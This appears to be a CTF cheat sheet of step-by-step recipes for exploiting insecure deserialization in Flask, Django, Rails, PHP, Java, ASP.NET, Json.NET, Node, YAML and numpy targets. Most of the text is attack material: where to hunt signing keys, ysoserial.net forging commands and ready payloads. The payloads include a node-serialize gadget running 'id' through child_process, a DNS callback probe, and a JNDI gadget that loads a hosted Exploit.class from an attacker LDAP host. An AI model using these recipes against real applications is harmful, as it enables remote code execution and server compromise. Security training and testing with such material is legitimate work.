# CTF Recipes — end-to-end plays per delivery shape

## Recipe: the Flask `session` cookie

```
signal:   Set-Cookie: session=eyJ...   + Werkzeug/Flask
format:   itsdangerous JSON (post-1.0) or signed pickle (pre-1.0)
key hunt: SECRET_KEY in app.py / config.py / .env / error page / weak-secret
forge:    itsdangerous.URLSafeTimedSerializer(key).dumps(gadget)
gadget:   if serializer is pickle — a __reduce__ os.system payload;
          if JSON — a py/object jsonpickle payload or a field the app evals
```

## Recipe: the Django `sessionid`

```
signal:   sessionid=... + django
format:   signed pickle (old) or JSON+signer
key hunt: SECRET_KEY in settings.py / env / DEBUG page
forge:    django.core.signing.loads/dumps with the key
gadget:   pickle payload inside the signed session
```

## Recipe: the Rails `_app_session` Marshal cookie

```
signal:   _app_session=... + X-Powered-By/Ruby
format:   HMAC(secret_key_base) + Marshal
key hunt: config/secrets.yml, credentials.yml.enc + master.key, ENV,
          error page, default "secret" in old apps
forge:    Marshal.dump(universal-ERB-graph) → base64 → HMAC-SHA1(key)
gadget:   the ActiveSupport::Deprecation ERB universal chain
```

## Recipe: the PHP cookie `unserialize`

```
signal:   Set-Cookie: user=... + PHP/X-Powered-By: PHP
format:   base64(serialize(...))  or  serialize directly
key hunt: usually unsigned — but check a sig field
probe:    corrupt → unserialize() error → confirmed
gadget:   phpgcc chain for the composer libs
```

## Recipe: the Java cookie/body `rO0AB`

```
signal:   rO0AB in cookie/body + tomcat/jetty/jboss
format:   Java OIS — usually unsigned
probe:    URLDNS → callback = readObject confirmed
fingerprint: classpath → GadgetProbe or serialVersionUID error
gadget:   ysoserial chain for the measured lib version
```

## Recipe: the ASP.NET `__VIEWSTATE`

```
signal:   __VIEWSTATE + .aspx
format:   LosFormatter + machineKey MAC
key hunt: web.config / Blacklist3r / error page
forge:    ysoserial.net -p ViewState -g TextFormattingRunProperties
          --validationalg --validationkey --decryptionalg --decryptionkey
          --generator --path --apppath
gadget:   TextFormattingRunProperties or TypeConfuseDelegate
```

## Recipe: the Json.NET `$type` body

```
signal:   {"$type":"..."} in a JSON body + .NET
format:   Json.NET with TypeNameHandling
probe:    {"$type":"Attacker.Probe,X"} → JsonException names it
gadget:   ysoserial.net -g ObjectDataProvider -f Json.Net
```

## Recipe: the Node `node-serialize` cookie

```
signal:   JSON cookie/body + express/node
format:   _$$ND_FUNC$$_ revive
probe:    {"x":"_$$ND_FUNC$$_function(){require('dns').lookup('x.YOU')}()"}
gadget:   {"x":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
```

## Recipe: the phar upload+file-op

```
signal:   file upload (avatar/import) + a file path parameter
format:   phar metadata — a polyglot GIF+phar
upload:   archive_gen phar --metadata '<pop>' > x.jpg → upload as .jpg
trigger:  any file-op on phar://<stored-path>/x → metadata deserializes
gadget:   the POP chain serialized into the metadata
```

## Recipe: the job-queue second-order

```
signal:   enqueue/task/queue endpoint + a background worker
format:   the job's serialized body (pickle/Marshal/PHP/Java)
write:    enqueue a gadget job
trigger:  the worker dequeues+unserializes → fires out of band
confirm:  OOB callback or a file write you then read
```

## Recipe: the YAML config upload

```
signal:   upload a .yml/.yaml the app loads
format:   PyYAML/Snakeyaml/Psych typed tags
probe:    !!python/object:does.not.Exist → ConstructorException
gadget:   !!python/object/apply:subprocess.check_output / the lib chain
```

## Recipe: the pickle in a cache/job

```
signal:   a cache-put/job-endpoint that stores an opaque blob
format:   pickle — gAN... / gAR...
write:    PUT the pickled gadget
trigger:  another endpoint's cache-get / the worker
confirm:  OOB or file-write readback
```

## Recipe: the Java JNDI via `JdbcRowSetImpl`

```
signal:   fastjson/jackson typed JSON OR a readObject chain
format:   {"@type":"com.sun.rowset.JdbcRowSetImpl",...}
setup:    JNDIExploit/marshalsec listener + hosted Exploit.class
gadget:   dataSourceName=ldap://YOU/x, autoCommit=true
confirm:  the lookup callback + the classload
```

## Recipe: the Python `npy` allow_pickle

```
signal:   an ML upload — .npy/.npz/.joblib/.pkl
format:   numpy object array = embedded pickle
mint:     np.save('x.npy', np.array([payload_obj], dtype=object),
          allow_pickle=True)
trigger:  np.load(..., allow_pickle=True)
gadget:   the __reduce__ inside the array element
```

## The meta-recipe — the invariant steps

```
1. fingerprint   → magic bytes → format
2. reachability  → corrupt-diff → parser error
3. benign probe  → marker / URLDNS / OOB
4. key/version   → hunt + measure
5. gadget        → matched to the measured classpath
6. verify        → verbatim flag/RCE in response or OOB log
```

Every recipe is these six steps; the delivery shape only changes which
wrapper the blob rides in.
